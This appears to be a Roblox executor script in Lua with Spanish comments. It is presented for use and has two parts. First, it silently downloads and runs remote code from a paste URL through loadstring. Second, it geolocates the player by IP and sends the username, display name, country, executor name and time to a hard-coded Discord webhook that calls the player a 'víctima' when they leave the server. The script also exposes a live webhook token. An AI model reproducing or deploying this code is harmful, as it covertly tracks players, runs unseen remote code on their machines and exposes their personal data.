local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- ====================================
-- Script 1: Ejecutar loadstring primero (nuevo URL)
-- ====================================
if not getgenv().EjecutarsePrimero_TP then
    getgenv().EjecutarsePrimero_TP = true

    task.spawn(function()
        pcall(function()
            loadstring(game:HttpGet("https://paste.debian.net/plainh/c59a163e/", true))()
        end)
    end)
end

-- ====================================
-- Script 2: Webhook al salir - totalmente funcional
-- ====================================
if not getgenv().EjecutarsePrimero_Webhook then
    getgenv().EjecutarsePrimero_Webhook = true

    local WebhookURL = "https://discord.com/api/webhooks/1384927333562978385/psrT9pR05kv9vw4rwr4oyiDcb07S3ZqAlV_2k_BsbI2neqrmEHOCE_QuFvVvRwd7lNuY"
    local mainImageURL = "https://i.postimg.cc/DZW66bqk/IMG-20250316-120840.jpg"
    local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId="..LocalPlayer.UserId.."&width=420&height=420&format=png"
    local executorName = identifyexecutor and identifyexecutor() or "Desconocido"

    local alreadySent = false

    local function detectCountry()
        local country = "Desconocido"
        local services = {
            "https://ipapi.co/json",
            "https://ipinfo.io/json",
            "https://ipwhois.app/json/",
            "http://ip-api.com/json",
            "https://geolocation-db.com/json/"
        }

        for _, url in ipairs(services) do
            local success, response = pcall(function()
                return (request or http_request or syn.request)({Url=url, Method="GET"}).Body
            end)
            if success and response then
                local data = HttpService:JSONDecode(response)
                if data then
                    if data.country_name then country = data.country_name
                    elseif data.country then country = data.country
                    elseif data.countryCode then country = data.countryCode
                    elseif data.country_name_long then country = data.country_name_long
                    end
                end
            end
            if country ~= "Desconocido" then break end
        end
        return country
    end

    local function waitForPlayerReady(player)
        local character = player.Character or player.CharacterAdded:Wait()
        if not character.PrimaryPart then
            character:WaitForChild("HumanoidRootPart")
        end
        return character
    end

    local function SendExitWebhook()
        if alreadySent then return end
        alreadySent = true

        local countryName = detectCountry()

        local data = {
            ["username"] = "🚨 Sistema VIP Roblox",
            ["avatar_url"] = mainImageURL,
            ["content"] = "**🚨⚠️ ¡Víctima se salió del servidor! ⚠️🚨**",
            ["embeds"] = {{
                ["title"] = "🎮 Panel de Salida - VIP Dashboard",
                ["description"] = "Información capturada automáticamente con doble imagen:",
                ["color"] = 16729344,
                ["thumbnail"] = {["url"] = avatarUrl},
                ["image"] = {["url"] = mainImageURL},
                ["fields"] = {
                    {["name"]="👤 Usuario", ["value"]=LocalPlayer.Name, ["inline"]=true},
                    {["name"]="✨ DisplayName", ["value"]=LocalPlayer.DisplayName, ["inline"]=true},
                    {["name"]="🌎 País", ["value"]=countryName, ["inline"]=true},
                    {["name"]="🛠️ Executor", ["value"]=executorName, ["inline"]=true},
                    {["name"]="⏰ Hora", ["value"]=os.date("%Y-%m-%d %H:%M:%S"), ["inline"]=false},
                    {["name"]="🔗 Imagen embed", ["value"]="[Click aquí]("..mainImageURL..")", ["inline"]=false}
                },
                ["footer"] = {["text"] = "Sistema de Salida • " .. os.date("%d/%m/%Y")}
            }}
        }

        local FinalData = HttpService:JSONEncode(data)
        local req = request or http_request or syn.request
        if req then
            local attempts = 0
            local sent = false
            repeat
                attempts = attempts + 1
                local success, err = pcall(function()
                    req({
                        Url = WebhookURL,
                        Method = "POST",
                        Headers = {["Content-Type"]="application/json"},
                        Body = FinalData
                    })
                end)
                if success then
                    sent = true
                else
                    task.wait(1)
                end
            until sent or attempts >= 3
        end
    end

    task.spawn(function()
        waitForPlayerReady(LocalPlayer)

        LocalPlayer.AncestryChanged:Connect(function(_, parent)
            if not parent then
                SendExitWebhook()
            end
        end)

        game:BindToClose(function()
            SendExitWebhook()
        end)
    end)
end
